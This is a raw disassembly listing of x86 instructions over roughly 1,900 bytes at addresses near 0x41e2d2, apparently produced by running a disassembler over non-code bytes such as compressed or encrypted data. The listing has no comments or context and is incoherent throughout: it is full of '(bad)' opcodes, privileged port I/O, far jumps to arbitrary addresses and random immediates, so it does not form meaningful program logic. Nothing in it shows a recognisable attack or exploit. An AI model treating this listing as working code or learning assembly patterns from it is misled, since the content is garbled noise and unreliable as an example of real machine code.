  41e2d2:	mov    BYTE PTR [edi+0x7d],cl
  41e2d5:	xchg   edx,eax
  41e2d6:	fsubrp st(1),st
  41e2d8:	pop    ebp
  41e2d9:	fbstp  TBYTE PTR [edx+0x10]
  41e2dc:	xchg   ecx,eax
  41e2dd:	(bad)  
  41e2de:	ficomp DWORD PTR [edi]
  41e2e0:	cmp    bh,0x74
  41e2e3:	loop   0x41e338
  41e2e5:	dec    eax
  41e2e6:	sar    BYTE PTR [eax+0x34db40c4],1
  41e2ec:	jno    0x41e26e
  41e2ee:	push   edi
  41e2ef:	add    eax,0x3a14285d
  41e2f4:	pop    esp
  41e2f5:	xor    al,bl
  41e2f7:	or     al,dl
  41e2f9:	and    edi,esp
  41e2fb:	mov    bh,0x9
  41e2fd:	xchg   BYTE PTR [ecx+0x5e49e83],ch
  41e303:	(bad)  
  41e304:	sahf   
  41e305:	add    DWORD PTR [eax+0x0],edx
	...
  41e310:	add    BYTE PTR [esi-0x9],ch
  41e313:	mov    ebx,0xfe6dbb69
  41e318:	not    DWORD PTR [edx+eax*1+0x31]
  41e31c:	pop    ecx
  41e31d:	neg    BYTE PTR [ebp+0x5ea12bf1]
  41e323:	add    DWORD PTR [eax],eax
  41e325:	scas   al,BYTE PTR es:[edi]
  41e326:	add    eax,DWORD PTR [eax]
  41e328:	add    BYTE PTR [ecx-0x7f],ah
  41e32b:	sbb    ebp,DWORD PTR [ebp-0xd]
  41e32e:	and    al,BYTE PTR ds:0x57a67735
  41e334:	ds clc 
  41e336:	jnp    0x41e305
  41e338:	cdq    
  41e339:	mov    edx,es
  41e33b:	pop    edx
  41e33c:	push   esi
  41e33d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e33e:	loope  0x41e302
  41e340:	in     eax,dx
  41e341:	mov    ds:0x7e9f6cdf,al
  41e346:	mov    ah,0x7c
  41e348:	retf   
  41e349:	lahf   
  41e34a:	(bad)  
  41e34b:	jns    0x41e31d
  41e34d:	cmp    esp,DWORD PTR ds:0xff65c1fc
  41e353:	sbb    al,0x9c
  41e355:	cmp    ah,dl
  41e357:	xchg   DWORD PTR [ecx-0x1c],edx
  41e35a:	jns    0x41e323
  41e35c:	repz xchg ebx,eax
  41e35e:	iret   
  41e35f:	imul   ebp,DWORD PTR ds:0x8a5ec9da,0x2f329cb3
  41e369:	dec    eax
  41e36a:	ds jb  0x41e325
  41e36d:	pop    esi
  41e36e:	lds    edi,FWORD PTR [eax]
  41e370:	xchg   edx,eax
  41e371:	icebp  
  41e372:	mov    edi,0xcced9521
  41e377:	adc    edx,DWORD PTR [si+0x3030]
  41e37c:	rcl    eax,0x7d
  41e37f:	jb     0x41e35c
  41e381:	push   ds
  41e382:	mov    cl,0x9d
  41e384:	xchg   ebx,eax
  41e385:	jbe    0x41e33d
  41e387:	iret   
  41e388:	xchg   edx,eax
  41e389:	fmul   QWORD PTR [edx+0x73ad76bd]
  41e38f:	les    ebx,FWORD PTR [ecx+0x46]
  41e392:	(bad)  
  41e393:	mov    eax,ds:0xe3c480c4
  41e398:	data16 lock arpl WORD PTR [eax],bx
  41e39c:	dec    ecx
  41e39d:	fstp   TBYTE PTR [esi+0x129e920b]
  41e3a3:	sbb    DWORD PTR [edx+0x65e2ce76],ebx
  41e3a9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e3aa:	jno    0x41e360
  41e3ac:	xchg   BYTE PTR [esi-0x416673d8],bh
  41e3b2:	aas    
  41e3b3:	jg     0x41e413
  41e3b5:	pop    ecx
  41e3b6:	cmp    al,0xe2
  41e3b8:	adc    DWORD PTR [ebx+0x58],ecx
  41e3bb:	mov    edi,0xef8c92a0
  41e3c0:	jns    0x41e39b
  41e3c2:	in     eax,0x30
  41e3c4:	xchg   esi,eax
  41e3c5:	popf   
  41e3c6:	adc    esi,esi
  41e3c8:	xchg   BYTE PTR [edi],al
  41e3ca:	mov    bl,BYTE PTR [ebx]
  41e3cc:	dec    ecx
  41e3cd:	push   ecx
  41e3ce:	test   al,0x7b
  41e3d0:	mov    edx,0x8850300f
  41e3d5:	aaa    
  41e3d6:	lds    edi,FWORD PTR es:[ebp+0x175e9756]
  41e3dd:	(bad)  
  41e3de:	pop    esi
  41e3df:	pop    ebx
  41e3e0:	inc    edx
  41e3e1:	sbb    esp,DWORD PTR [ebx+0x55]
  41e3e4:	fld    TBYTE PTR [ebx+ebx*1]
  41e3e7:	push   ebp
  41e3e8:	push   edx
  41e3e9:	test   esi,eax
  41e3eb:	pop    ecx
  41e3ec:	out    dx,eax
  41e3ed:	mov    dl,0xf8
  41e3ef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e3f0:	push   ecx
  41e3f1:	sub    al,0x35
  41e3f3:	sub    BYTE PTR [eax],ah
  41e3f5:	push   es
  41e3f6:	or     DWORD PTR cs:[edx+0x7b],esi
  41e3fa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e3fb:	sbb    edi,DWORD PTR [eax]
  41e3fd:	rol    DWORD PTR [edi],cl
  41e3ff:	imul   esp,DWORD PTR [ebx*8+0x7b1d0afc],0x94020327
  41e40a:	inc    edi
  41e40b:	retf   
  41e40c:	js     0x41e46c
  41e40e:	mov    ecx,0xc19cb5d9
  41e413:	adc    DWORD PTR [ebx+0x5f],ebp
  41e416:	xor    eax,0x6caf00a3
  41e41b:	push   DWORD PTR [ebx+0x19cff353]
  41e421:	add    esp,esi
  41e423:	cmp    al,0x86
  41e425:	pop    ebp
  41e426:	add    ah,bh
  41e428:	test   DWORD PTR [edi+esi*8+0x58e9cfa5],edi
  41e42f:	sub    bh,BYTE PTR [esi+0x78]
  41e432:	xchg   dl,cl
  41e434:	mov    cl,BYTE PTR [ecx]
  41e436:	inc    esp
  41e437:	mov    bh,0x83
  41e439:	xor    al,0xf4
  41e43b:	cld    
  41e43c:	add    DWORD PTR [ebx-0x58],esp
  41e43f:	aad    0x76
  41e441:	xor    esi,0x3a45482d
  41e447:	adc    ch,BYTE PTR [eax]
  41e449:	cmc    
  41e44a:	fwait
  41e44b:	push   es
  41e44c:	stos   DWORD PTR es:[edi],eax
  41e44d:	mov    DWORD PTR [edx-0x19],eax
  41e450:	jne    0x41e482
  41e452:	ror    dh,0xb
  41e455:	add    esp,DWORD PTR [ebp-0x37f344e2]
  41e45b:	lea    esi,[eax]
  41e45d:	int3   
  41e45e:	mov    ebx,0xc45d60b9
  41e463:	popf   
  41e464:	xor    DWORD PTR [esp+edx*4],ebx
  41e467:	cmp    BYTE PTR [esp+eiz*2-0x71],dh
  41e46b:	nop
  41e46c:	xchg   edx,ebp
  41e46e:	or     cl,bl
  41e470:	mov    bl,BYTE PTR [ebx-0x6b]
  41e473:	retf   0x1985
  41e476:	inc    ecx
  41e477:	xchg   ebp,eax
  41e478:	and    BYTE PTR [edi],dl
  41e47a:	(bad)  
  41e47b:	jg     0x41e4e0
  41e47d:	aam    0xb2
  41e47f:	arpl   WORD PTR [edi+esi*4+0x58e97983],sp
  41e486:	cmp    esi,ecx
  41e488:	lock shr DWORD PTR es:[edx+0x2322f2cf],0x10
  41e491:	outs   dx,DWORD PTR ds:[esi]
  41e492:	or     al,0x59
  41e494:	pop    ss
  41e495:	ret    
  41e496:	mov    eax,ds:0x934126c0
  41e49b:	aas    
  41e49c:	or     dl,BYTE PTR [edi]
  41e49e:	mov    edi,0x91350097
  41e4a3:	lods   eax,DWORD PTR ds:[esi]
  41e4a4:	lods   al,BYTE PTR ds:[esi]
  41e4a5:	push   edi
  41e4a6:	jl     0x41e49f
  41e4a8:	aam    0x5b
  41e4aa:	sub    eax,0x5551f522
  41e4af:	adc    BYTE PTR [esi+0x236bd038],ah
  41e4b5:	lods   al,BYTE PTR ds:[esi]
  41e4b6:	push   0x76
  41e4b8:	sbb    DWORD PTR [edi],edx
  41e4ba:	icebp  
  41e4bb:	rcl    DWORD PTR [ebp-0x5f],1
  41e4be:	xor    esp,DWORD PTR [ecx-0x68890b82]
  41e4c4:	mov    ds:0xd1559ea0,al
  41e4c9:	in     eax,0x5a
  41e4cb:	dec    ecx
  41e4cc:	nop
  41e4cd:	pop    esi
  41e4ce:	stc    
  41e4cf:	pop    edi
  41e4d0:	sub    ah,BYTE PTR [esi-0x165ac965]
  41e4d6:	pop    ds
  41e4d7:	adc    BYTE PTR [ebp+0x63b81de2],bh
  41e4dd:	loope  0x41e55e
  41e4df:	nop
  41e4e0:	mov    WORD PTR [eax],ss
  41e4e2:	mov    ebp,0xc92bb547
  41e4e7:	ss xchg ebp,ecx
  41e4ea:	or     ah,BYTE PTR [ebx+0xc]
  41e4ed:	mov    bh,0x1
  41e4ef:	rol    edx,cl
  41e4f1:	rcl    DWORD PTR [ebx-0xd5fa63f],1
  41e4f7:	jmp    0x41e50d
  41e4f9:	push   ss
  41e4fa:	rcl    edi,1
  41e4fc:	sub    bl,BYTE PTR [edi]
  41e4fe:	push   edx
  41e4ff:	das    
  41e500:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e501:	(bad)  
  41e503:	outs   dx,DWORD PTR ds:[esi]
  41e504:	add    ch,BYTE PTR [ebx+0x3d]
  41e507:	aam    0xd5
  41e509:	cdq    
  41e50a:	sti    
  41e50b:	sub    DWORD PTR [ebx+0x33],esi
  41e50e:	icebp  
  41e50f:	dec    edx
  41e510:	xor    DWORD PTR [edi-0x2e8cd50e],edi
  41e516:	je     0x41e4c4
  41e518:	jno    0x41e52f
  41e51a:	mov    bh,0x8d
  41e51c:	in     al,0x1d
  41e51e:	fwait
  41e51f:	dec    eax
  41e520:	mov    ch,0xf5
  41e522:	xchg   edx,eax
  41e523:	or     dh,0xe0
  41e526:	hlt    
  41e527:	dec    ebx
  41e528:	lods   eax,DWORD PTR ds:[esi]
  41e529:	mov    eax,ds:0xc93e876f
  41e52e:	repnz clc 
  41e530:	mov    bh,0x2e
  41e532:	aas    
  41e533:	mov    ds:0x45e362fa,al
  41e538:	fstp   QWORD PTR [eax]
  41e53a:	cmp    ecx,DWORD PTR [eax]
  41e53c:	clc    
  41e53d:	sbb    bh,bl
  41e53f:	in     eax,dx
  41e540:	in     eax,dx
  41e541:	outs   dx,DWORD PTR ds:[esi]
  41e542:	out    dx,eax
  41e543:	cdq    
  41e544:	mov    bl,BYTE PTR [esi]
  41e546:	out    dx,al
  41e547:	or     BYTE PTR [eax],dl
  41e549:	push   esi
  41e54a:	adc    eax,0x47a68d77
  41e54f:	sbb    bh,BYTE PTR [ebx+edi*8]
  41e552:	cmp    DWORD PTR [ebp-0x7da52dc2],eax
  41e558:	cmp    esi,DWORD PTR [ebx-0x5a]
  41e55b:	(bad)  
  41e55c:	mov    BYTE PTR [edx+0x6baf74dc],al
  41e562:	pop    eax
  41e563:	add    esp,esi
  41e565:	lahf   
  41e566:	sub    BYTE PTR [eax+0x76f5e0b4],ah
  41e56c:	sub    ebx,0xdd1e1591
  41e572:	test   DWORD PTR [edi+0x5cb4ba79],eax
  41e578:	aaa    
  41e579:	mov    eax,0xa383c2d1
  41e57e:	push   0xa3d22786
  41e583:	pop    ebx
  41e584:	mov    ebp,0xd6cc0dfe
  41e589:	sahf   
  41e58a:	sbb    eax,0x45cdfab
  41e590:	shr    BYTE PTR [ebx],0xc
  41e593:	jns    0x41e525
  41e595:	lahf   
  41e596:	or     al,0x14
  41e598:	jge    0x41e551
  41e59a:	repnz add BYTE PTR [ebx+0x1f1768ce],ah
  41e5a1:	xor    al,0xa9
  41e5a3:	loope  0x41e52d
  41e5a5:	xor    DWORD PTR [ebx+0x17cca5c5],edi
  41e5ab:	pushf  
  41e5ac:	xor    eax,0x517ccfc0
  41e5b1:	inc    edx
  41e5b2:	rcr    DWORD PTR [ecx+ebx*4+0x70],cl
  41e5b6:	out    0xce,eax
  41e5b8:	push   ebp
  41e5b9:	cdq    
  41e5ba:	(bad)  
  41e5bb:	outs   dx,BYTE PTR ds:[esi]
  41e5bc:	push   ds
  41e5bd:	and    al,0xc1
  41e5bf:	or     ecx,eax
  41e5c1:	mov    ds:0xcc199bd8,eax
  41e5c6:	popf   
  41e5c7:	js     0x41e618
  41e5c9:	test   BYTE PTR ds:0xf80b8c7b,0x94
  41e5d0:	loope  0x41e57e
  41e5d2:	push   0x9848f5e
  41e5d7:	idiv   DWORD PTR [edx-0x22]
  41e5da:	mov    ds:0xd2761bde,eax
  41e5df:	mov    al,ds:0xfe24e0d8
  41e5e4:	sub    bh,dl
  41e5e6:	lahf   
  41e5e7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e5e8:	aad    0x6b
  41e5ea:	cmp    DWORD PTR [ecx],ebx
  41e5ec:	aas    
  41e5ed:	dec    esp
  41e5ee:	fcom   DWORD PTR [edx-0x65]
  41e5f1:	add    eax,0x3923bae7
  41e5f6:	inc    ebx
  41e5f7:	mov    bl,0x8
  41e5f9:	mov    dh,0x86
  41e5fb:	shl    DWORD PTR [eax+0x45],1
  41e5fe:	push   ebx
  41e5ff:	lods   al,BYTE PTR ds:[esi]
  41e600:	cmp    bh,cl
  41e602:	sbb    eax,0x2e024a30
  41e607:	aaa    
  41e608:	icebp  
  41e609:	xchg   DWORD PTR [edi-0x36],edx
  41e60c:	ja     0x41e5c0
  41e60e:	cmc    
  41e60f:	xchg   edx,eax
  41e610:	mov    DWORD PTR ds:0xc6b60072,ebx
  41e616:	jae    0x41e622
  41e618:	mov    ecx,DWORD PTR [eax+eiz*8]
  41e61b:	inc    edi
  41e61c:	xchg   esp,eax
  41e61d:	sub    ch,bh
  41e61f:	sbb    al,0x60
  41e621:	sbb    dh,bl
  41e623:	cmp    al,BYTE PTR [ebx+0x7415c6c6]
  41e629:	cld    
  41e62a:	and    edi,DWORD PTR [ecx-0x54]
  41e62d:	in     eax,0xaf
  41e62f:	mov    eax,ecx
  41e631:	mov    eax,0x88e12dd8
  41e636:	test   DWORD PTR [eax-0x205ed188],esi
  41e63c:	inc    edx
  41e63d:	gs stos BYTE PTR es:[edi],al
  41e63f:	fcom   st(3)
  41e641:	in     al,dx
  41e642:	nop
  41e643:	mov    cl,0xe0
  41e645:	jge    0x41e631
  41e647:	imul   ebx,DWORD PTR [ebx+0x36d17dc2],0x54
  41e64e:	cmp    esi,edi
  41e650:	aaa    
  41e651:	or     DWORD PTR [esp+eiz*2+0x50b3b131],ebp
  41e658:	mov    ebx,0xaf38d628
  41e65d:	adc    bh,BYTE PTR [esi+ecx*2+0xa]
  41e661:	push   cs
  41e662:	sub    edi,DWORD PTR [ebp+ecx*4+0x12]
  41e666:	shl    edi,cl
  41e668:	sub    BYTE PTR [edi],0x8f
  41e66b:	inc    ebx
  41e66c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e66d:	xchg   DWORD PTR [edx+edx*4],ebp
  41e670:	inc    ebp
  41e671:	xor    eax,0x1e28a7ee
  41e676:	fwait
  41e677:	push   es
  41e678:	stos   DWORD PTR es:[edi],eax
  41e679:	int3   
  41e67a:	std    
  41e67b:	test   BYTE PTR [ebp-0x3b7f6209],cl
  41e681:	std    
  41e682:	dec    esp
  41e683:	mov    ah,0xf5
  41e685:	mov    fs,WORD PTR gs:0x38314fef
  41e68c:	xchg   ebx,eax
  41e68d:	pop    edi
  41e68e:	(bad)  [eax-0x1a908293]
  41e694:	ins    DWORD PTR es:[edi],dx
  41e695:	inc    edi
  41e696:	push   ds
  41e697:	clc    
  41e698:	daa    
  41e699:	shl    DWORD PTR [ebp-0x2fd9d3e6],0xe1
  41e6a0:	mov    ah,BYTE PTR [esi+0x7]
  41e6a3:	xchg   esi,eax
  41e6a4:	ja     0x41e663
  41e6a6:	repnz mov cl,0x21
  41e6a9:	sar    DWORD PTR [eax+0x2b],0xfd
  41e6ad:	sbb    edi,DWORD PTR [eax-0x1a]
  41e6b0:	mov    ds:0x3c742228,eax
  41e6b5:	mov    ebx,0x3787d2bb
  41e6ba:	sbb    DWORD PTR [eax-0x76],esi
  41e6bd:	xchg   esi,eax
  41e6be:	fsubrp st(2),st
  41e6c0:	and    al,0x97
  41e6c2:	push   edx
  41e6c3:	clc    
  41e6c4:	push   edx
  41e6c5:	test   DWORD PTR [edi-0x75],0x268138a
  41e6cc:	or     al,0x2
  41e6ce:	test   BYTE PTR [esi+0x6b1f2877],0xbb
  41e6d5:	jge    0x41e68f
	...
  41e6df:	add    BYTE PTR [eax],al
  41e6e1:	sub    eax,0xfffb5fc4
  41e6e6:	sti    
  41e6e7:	lods   eax,DWORD PTR ds:[esi]
  41e6e8:	(bad)  
  41e6e9:	or     DWORD PTR [edi],ebp
  41e6eb:	jmp    0xe251235d
  41e6f0:	mov    edi,0x1624f
  41e6f5:	scas   al,BYTE PTR es:[edi]
  41e6f6:	add    eax,DWORD PTR [eax]
  41e6f8:	add    BYTE PTR [edx+0x2d],bh
  41e6fb:	popa   
  41e6fc:	sub    al,BYTE PTR [edx]
  41e6fe:	or     DWORD PTR [edi],esi
  41e700:	sub    al,0x31
  41e702:	fadd   DWORD PTR [ecx]
  41e704:	ja     0x41e711
  41e706:	pop    esi
  41e707:	cdq    
  41e708:	sub    al,0x63
  41e70a:	jae    0x41e758
  41e70c:	(bad)  
  41e70d:	cmp    al,0x88
  41e70f:	jae    0x41e6cb
  41e711:	push   edi
  41e712:	xor    al,0xa6
  41e714:	pop    esi
  41e715:	push   ebx
  41e716:	jg     0x41e77e
  41e718:	loop   0x41e74e
  41e71a:	pop    eax
  41e71b:	leave  
  41e71c:	jecxz  0x41e726
  41e71e:	inc    esi
  41e71f:	sbb    al,0x0
  41e721:	stc    
  41e722:	shr    al,1
  41e724:	push   edx
  41e725:	rep ins BYTE PTR es:[edi],dx
  41e727:	sub    eax,0x29bb94e3
  41e72c:	repnz loopne 0x41e6b5
  41e72f:	ins    DWORD PTR es:[edi],dx
  41e730:	add    eax,edi
  41e732:	cli    
  41e733:	inc    edi
  41e734:	lock shr BYTE PTR [ebp+ebx*2+0x1c9fa277],cl
  41e73c:	sub    DWORD PTR [ebp-0x2f5d37dd],edi
  41e742:	push   esp
  41e743:	int3   
  41e744:	loope  0x41e6d2
  41e746:	xchg   ecx,eax
  41e747:	je     0x41e715
  41e749:	aaa    
  41e74a:	cmp    DWORD PTR [eax-0x55c2e4f4],edi
  41e750:	(bad)  
  41e751:	mov    bl,0x51
  41e753:	test   eax,0x73a3bef1
  41e758:	ds push es
  41e75a:	mov    ah,0x65
  41e75c:	call   0x95d99582
  41e761:	or     esp,edi
  41e763:	inc    esi
  41e764:	fistp  QWORD PTR [edx-0x7931253d]
  41e76a:	das    
  41e76b:	pop    edx
  41e76c:	test   BYTE PTR [ebp+0x4d],dh
  41e76f:	fst    DWORD PTR [ebp-0x3b]
  41e772:	dec    ebp
  41e773:	jb     0x41e764
  41e775:	por    mm0,mm4
  41e778:	das    
  41e779:	shl    DWORD PTR [esi+0x50],1
  41e77c:	jnp    0x41e7a4
  41e77e:	cdq    
  41e77f:	push   cs
  41e780:	pushf  
  41e781:	int    0x77
  41e783:	adc    ebp,edi
  41e785:	push   es
  41e786:	xchg   eax,ebp
  41e788:	aaa    
  41e789:	mov    eax,0x67d70431
  41e78e:	push   ebx
  41e78f:	mov    DWORD PTR [ecx+0x7bc893d4],eax
  41e795:	cmp    eax,0x174eba8
  41e79a:	jmp    0xbd5a:0x1874f899
  41e7a1:	mov    ebp,0x6ad8259
  41e7a6:	jge    0x41e770
  41e7a8:	or     ecx,DWORD PTR ds:0x8a84a749
  41e7ae:	lock xchg ebx,eax
  41e7b0:	and    bl,BYTE PTR [edi]
  41e7b2:	mov    eax,ds:0x46a964e9
  41e7b7:	mov    edi,0xe877c649
  41e7bc:	xchg   ebp,eax
  41e7bd:	in     al,dx
  41e7be:	arpl   WORD PTR [esi-0x1d],ax
  41e7c1:	(bad)  
  41e7c2:	pop    ecx
  41e7c3:	mov    bh,0x7f
  41e7c5:	add    DWORD PTR [edx-0x7d],0x61d65388
  41e7cc:	or     eax,0x4c0a3079
  41e7d1:	inc    ebp
  41e7d2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e7d3:	add    edi,DWORD PTR [ebx+0x7ef398c5]
  41e7d9:	jge    0x41e84b
  41e7db:	sub    BYTE PTR [eax],dh
  41e7dd:	fldenv [esi+0x3c]
  41e7e0:	test   al,0x4
  41e7e2:	push   cs
  41e7e3:	cmp    DWORD PTR [ebp+0x38],esi
  41e7e6:	lahf   
  41e7e7:	aaa    
  41e7e8:	and    al,0xfb
  41e7ea:	adc    ecx,esi
  41e7ec:	into   
  41e7ed:	sbb    edi,DWORD PTR [ebp-0x44052ab5]
  41e7f3:	jmp    0xd6f13208
  41e7f8:	mov    ds,WORD PTR [edx+eax*8]
  41e7fb:	mov    ds,WORD PTR [edi-0x53]
  41e7fe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e7ff:	push   edx
  41e800:	(bad)  
  41e801:	hlt    
  41e802:	mov    bl,0x22
  41e804:	test   eax,0xba924c5f
  41e809:	dec    edx
  41e80a:	fiadd  WORD PTR ds:0x291f7936
  41e810:	pop    edx
  41e811:	pop    ds
  41e812:	lds    esi,FWORD PTR ds:[edi]
  41e815:	out    dx,al
  41e816:	dec    ecx
  41e817:	lea    edx,[ebx+0x3d]
  41e81a:	push   0x8cae4df7
  41e81f:	jne    0x41e7df
  41e821:	push   ss
  41e822:	mov    al,0x44
  41e824:	fidiv  WORD PTR [edi]
  41e826:	not    edx
  41e828:	fst    DWORD PTR [edi-0x477b6a9d]
  41e82e:	adc    DWORD PTR [edi],0x40
  41e831:	sbb    ah,BYTE PTR [eax-0x6701fdd3]
  41e837:	dec    eax
  41e838:	rcl    BYTE PTR [esi-0x13],cl
  41e83b:	xchg   esp,eax
  41e83c:	fiadd  WORD PTR [esi-0x729f3759]
  41e842:	loop   0x41e7ff
  41e844:	push   eax
  41e845:	adc    al,0x15
  41e847:	xchg   DWORD PTR [edi+0x63],ecx
  41e84a:	xor    BYTE PTR [ebx+0x1584b812],cl
  41e850:	test   BYTE PTR [eax-0x55],dh
  41e853:	sahf   
  41e854:	(bad)  
  41e856:	xchg   ecx,eax
  41e857:	popf   
  41e858:	ins    DWORD PTR es:[edi],dx
  41e859:	push   edx
  41e85a:	aad    0x62
  41e85c:	pop    edi
  41e85d:	scas   al,BYTE PTR es:[edi]
  41e85e:	scas   eax,DWORD PTR es:[edi]
  41e85f:	or     eax,0x21e503d3
  41e864:	ficomp DWORD PTR [esi]
  41e866:	jp     0x41e875
  41e868:	std    
  41e869:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e86a:	popf   
  41e86b:	out    0x7d,al
  41e86d:	out    dx,al
  41e86e:	outs   dx,BYTE PTR ds:[esi]
  41e86f:	cmp    DWORD PTR [esi-0x1595238f],ebx
  41e875:	arpl   WORD PTR [ebp+0x78],di
  41e878:	cmp    DWORD PTR [ebx-0x382b701c],edx
  41e87e:	mov    al,cl
  41e880:	sbb    ecx,DWORD PTR [edx-0x387c0dc8]
  41e886:	sbb    ecx,DWORD PTR [edi]
  41e888:	test   bh,0x1e
  41e88b:	pop    ebp
  41e88c:	xor    cl,bl
  41e88e:	out    dx,al
  41e88f:	sub    al,0xe4
  41e891:	cmp    al,0xd1
  41e893:	fisttp QWORD PTR [ebx+0x43916d86]
  41e899:	mov    al,0x53
  41e89b:	xor    ch,BYTE PTR [ebx+0x2989d99b]
  41e8a1:	adc    al,0xb6
  41e8a3:	or     al,0x0
  41e8a5:	iret   
  41e8a6:	fisubr WORD PTR [ebp-0x26]
  41e8a9:	and    BYTE PTR [ebx],ah
  41e8ab:	push   0xfffffff0
  41e8ad:	nop
  41e8ae:	pop    edx
  41e8af:	test   DWORD PTR [esi+0x2b],ebp
  41e8b2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e8b3:	pushf  
  41e8b4:	repnz aam 0x67
  41e8b7:	(bad)  
  41e8b8:	pop    edx
  41e8b9:	and    BYTE PTR [eax+0x16],bl
  41e8bc:	push   edx
  41e8bd:	dec    ebp
  41e8be:	mov    bh,0xec
  41e8c0:	xor    bl,BYTE PTR [ecx+0x172ed756]
  41e8c6:	imul   ecx,DWORD PTR ds:0xcd30c350,0x8ac190e0
  41e8d0:	add    al,0xa2
  41e8d2:	call   0x109466f7
  41e8d7:	les    ebx,FWORD PTR [ecx+edi*4+0x3622916c]
  41e8de:	add    eax,0x31e8bcc0
  41e8e3:	fwait
  41e8e4:	int    0x24
  41e8e6:	mov    cl,cl
  41e8e8:	adc    al,0x54
  41e8ea:	das    
  41e8eb:	mov    dl,0x2d
  41e8ed:	mov    ds:0x91d7b96f,al
  41e8f2:	(bad)  
  41e8f3:	sbb    DWORD PTR [ebx],edx
  41e8f5:	sbb    dh,dh
  41e8f7:	mov    bh,dl
  41e8f9:	fwait
  41e8fa:	sbb    eax,DWORD PTR [edi]
  41e8fc:	repz push ebx
  41e8fe:	and    eax,0xb3623905
  41e903:	push   ecx
  41e904:	xchg   eax,esp
  41e906:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e907:	aaa    
  41e908:	fcmovu st,st(1)
  41e90a:	sti    
  41e90b:	mov    ch,0xd7
  41e90d:	(bad)
  41e911:	sar    DWORD PTR [ebp-0x109ed461],cl
  41e917:	leave  
  41e918:	sub    esi,edx
  41e91a:	xchg   ebx,eax
  41e91b:	in     al,dx
  41e91c:	out    dx,eax
  41e91d:	in     al,dx
  41e91e:	sbb    dh,bh
  41e920:	mov    dh,BYTE PTR [ecx-0x3a0b631e]
  41e926:	mov    WORD PTR [ecx],?
  41e928:	pushf  
  41e929:	retf   0x8620
  41e92c:	xchg   ecx,eax
  41e92d:	push   esp
  41e92e:	lods   al,BYTE PTR ds:[esi]
  41e92f:	fwait
  41e930:	mov    edx,0x51946f57
  41e935:	arpl   WORD PTR [esp+edx*2-0x195f33b4],di
  41e93c:	xor    DWORD PTR [ebx],0x3177f045
  41e942:	jmp    0x51febed3
  41e947:	xor    edi,edx
  41e949:	jg     0x41e9c1
  41e94b:	xchg   edx,eax
  41e94c:	push   0xdee3e3f2
  41e951:	or     al,0xfa
  41e953:	fadd   DWORD PTR [esp+esi*1+0x37]
  41e957:	fs call 0xf0d80deb
  41e95d:	pop    ecx
  41e95e:	rcl    BYTE PTR [ebp+edx*2+0x39],cl
  41e962:	sbb    al,0xec
  41e964:	xchg   edi,eax
  41e965:	xor    al,0xb3
  41e967:	xchg   esi,eax
  41e968:	mov    ebp,0x6fbc61b4
  41e96d:	inc    eax
  41e96e:	mov    ds,WORD PTR [ecx]
  41e970:	sbb    BYTE PTR [ebp+0x68ad2058],0xbd
  41e977:	add    BYTE PTR [ebx],bh
  41e979:	sub    al,BYTE PTR [edi+0x2c]
  41e97c:	add    DWORD PTR [ecx-0x20],ebp
  41e97f:	push   ecx
  41e980:	push   esi
  41e981:	stc    
  41e982:	dec    esp
  41e983:	ja     0x41e969
  41e985:	jo     0x41e9c1
  41e987:	(bad)
  41e98c:	(bad)  
  41e98d:	in     eax,dx
  41e98e:	dec    ecx
  41e98f:	jns    0x41e92a
  41e991:	rcr    BYTE PTR [ebp+0x7],0x7e
  41e995:	mov    bh,0xf7
  41e997:	aaa    
  41e998:	and    BYTE PTR [ecx+0x27],bh
  41e99b:	fisttp QWORD PTR [ebx-0x13bb7c46]
  41e9a1:	mov    eax,0xcce6d5e9
  41e9a6:	pusha  
  41e9a7:	jb     0x41e932
  41e9a9:	ds add al,0xd0
  41e9ac:	dec    eax
  41e9ad:	inc    esp
  41e9ae:	dec    esi
  41e9af:	and    BYTE PTR gs:[edx+0x5c],bl
  41e9b3:	into   
  41e9b4:	jp     0x41e965
  41e9b6:	sub    bh,BYTE PTR [ebx-0x24]
  41e9b9:	ret    0x500d
  41e9bc:	mov    dl,0xc1
  41e9be:	push   ds
  41e9bf:	not    bh
  41e9c1:	mov    bh,0xbc
  41e9c3:	push   ecx
  41e9c4:	and    eax,0xc49728d6
  41e9c9:	push   cs
  41e9ca:	pop    ss
  41e9cb:	mov    ebx,0x638199b4
  41e9d0:	fs aas 
  41e9d2:	test   DWORD PTR [edi-0x46a79501],ecx
  41e9d8:	push   ecx
  41e9d9:	push   eax
  41e9da:	stc    
  41e9db:	repz push ds
  41e9dd:	pop    eax
  41e9de:	adc    DWORD PTR [esi],ebx
  41e9e0:	fdiv   QWORD PTR [edi-0x7a]
  41e9e3:	cmp    eax,0x1b426964
  41e9e8:	sub    eax,esp
  41e9ea:	add    edi,DWORD PTR [ebp-0x50]
  41e9ed:	mov    esi,DWORD PTR [bx]
  41e9f0:	inc    ecx
  41e9f1:	jo     0x41e98b
  41e9f3:	enter  0x63ce,0x30
  41e9f7:	lea    eax,ss:[edx-0x64cdd642]
  41e9fe:	dec    ebp
  41e9ff:	sbb    al,0xd
  41ea01:	popf   
  41ea02:	retf   0x603a
  41ea05:	pop    esp
  41ea06:	aas    
  41ea07:	lds    ebx,FWORD PTR [ebx+esi*8+0x5c]
  41ea0b:	shl    DWORD PTR [ebx-0x60f947a9],1
  41ea11:	mov    BYTE PTR [ecx+edx*1],bl
  41ea14:	dec    ecx
  41ea15:	mov    esp,0x6261e603
  41ea1a:	test   eax,0x626fb636
  41ea1f:	jbe    0x41e9bc
  41ea21:	push   edx
  41ea22:	dec    ecx
  41ea23:	test   al,0x9
  41ea25:	pop    edx
  41ea26:	adc    al,0x10
  41ea28:	push   0x2b555962
  41ea2d:	inc    eax
  41ea2e:	in     al,0xd5
  41ea30:	push   es
  41ea31:	fwait
  41ea32:	aaa    
  41ea33:	inc    edi
  41ea34:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ea35:	jp     0x41e9c6
  41ea37:	repnz xchg ebp,eax
